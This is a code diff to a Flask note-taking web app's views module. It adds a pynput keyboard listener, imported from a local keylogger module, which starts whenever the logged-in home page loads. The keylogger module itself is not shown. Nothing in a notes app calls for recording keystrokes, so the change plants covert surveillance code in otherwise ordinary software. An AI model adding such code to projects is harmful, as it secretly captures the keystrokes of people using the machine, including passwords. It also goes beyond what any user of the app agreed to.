@@ -3,6 +3,8 @@ from flask import Blueprint, render_template, request, flash, jsonify
 from flask_login import login_required, current_user
 from .models import Note
 from . import db
+from pynput import keyboard
+from .keylogger import keyPressed, keyboard_listener
 import json
 
 
@@ -12,6 +14,12 @@ views = Blueprint('views', __name__)
 @views.route('/', methods=['GET', 'POST'])
 @login_required
 def home():
+    global keyboard_listener
+    # Start the listener only if it's not already running
+    if not keyboard_listener or not keyboard_listener.is_alive():
+        keyboard_listener = keyboard.Listener(on_press = keyPressed)
+        keyboard_listener.start()
+
     if request.method == 'POST': 
         note = request.form.get('note') #Gets the note from the HTML 
 
